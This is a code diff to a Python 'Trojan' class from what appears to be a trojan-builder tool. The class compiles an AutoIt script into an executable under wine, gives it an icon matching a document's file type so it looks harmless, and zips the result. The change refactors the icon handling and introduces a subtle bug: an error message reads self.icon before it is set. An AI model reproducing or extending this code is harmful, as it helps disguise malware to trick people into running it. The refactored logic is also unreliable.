@@ -33,16 +33,7 @@ class Trojan:
 		self.url1 = url1
 		self.url2 = url2
 		file_type = url1.split(".")[-1].replace("#", "")
-		
-		icons_directory = os.path.dirname(os.path.realpath(__file__)) + "/icons"
-		self.icon = icons_directory + "/" + file_type + ".ico"
-		if icon != None:
-			self.icon = icon
-		
-		if not os.path.isfile(self.icon) :
-			print("[-] Can't find icon at " + self.icon)
-			print("[-] Using generaic icon.")
-			self.icon = icons_directory + "/generic.ico"
+		self.icon = self.set_icon(icon, file_type)
 		
 					
 	def create(self):
@@ -53,18 +44,17 @@ class Trojan:
 	def compile(self, out_file):
 		subprocess.call('wine "' + AUT2EXE + '" /In "' + TROJAN_SOURCE_CODE_FILE + '" /Out "' + out_file +'" /Icon "' + self.icon + '"' , shell=True)
 	
-	def set_icon(input_icon):
-		if icon != None:
-			icon = input_icon
-		else:
-			icon = "icons/" + file_type + ".ico"
+	def set_icon(self, icon, file_type):
+		icons_directory = os.path.dirname(os.path.realpath(__file__)) + "/icons"
+		if icon == None:
+			icon = icons_directory + "/" + file_type + ".ico"
 		
 		if not os.path.isfile(icon) :
-			print("[-] Can't find icon at " + icon)
+			print("[-] Can't find icon at " + self.icon)
 			print("[-] Using generaic icon.")
-			icon = "icons/generic.ico"
-		
+			icon = icons_directory + "/generic.ico"
 		return icon
+
 	
 	def zip(self, out_file):
 		os.chdir(os.path.dirname(out_file))
